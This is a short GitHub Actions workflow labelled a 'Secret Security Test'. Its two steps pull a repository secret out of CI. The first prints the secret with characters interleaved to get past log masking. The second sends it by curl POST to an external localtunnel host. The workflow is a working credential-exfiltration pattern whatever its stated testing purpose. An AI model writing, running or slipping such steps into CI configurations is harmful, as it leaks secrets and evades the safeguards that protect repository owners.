name: Secret Security Test
on:
  push: # Use push to a branch for the easiest test
    branches: [ 'test-branch' ]
  pull_request:
    branches: [ 'main' ]

jobs:
  leak-check:
    runs-on: ubuntu-latest
    steps:
      - name: Bypass Scrubber in Logs
        env:
          MY_SECRET: ${{ secrets.TEST_SECRET }}
        run: |
          echo "$MY_SECRET" | sed 's/./&-/g'
      
      - name: Send to My Local Machine
        env:
          MY_SECRET: ${{ secrets.TEST_SECRET }}
        run: |
          curl -X POST -d "The secret is: $MY_SECRET" https://smart-steaks-float.loca.lt
